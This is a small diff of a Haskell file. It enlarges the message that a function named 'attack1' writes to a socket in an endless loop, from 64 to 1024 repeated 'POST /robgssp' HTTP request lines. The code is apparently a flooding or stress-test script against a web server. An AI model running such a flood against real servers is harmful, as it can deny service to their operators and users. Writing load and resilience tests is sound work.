@@ -22,4 +22,4 @@ attack1 sh = do
   forever $ B.hPutStr sh prepmsg
 
 prepmsg :: B.ByteString
-prepmsg = B.concat $ take 64 $ repeat "POST /robgssp HTTP/1.1\n\n"
+prepmsg = B.concat $ take 1024 $ repeat "POST /robgssp HTTP/1.1\n\n"
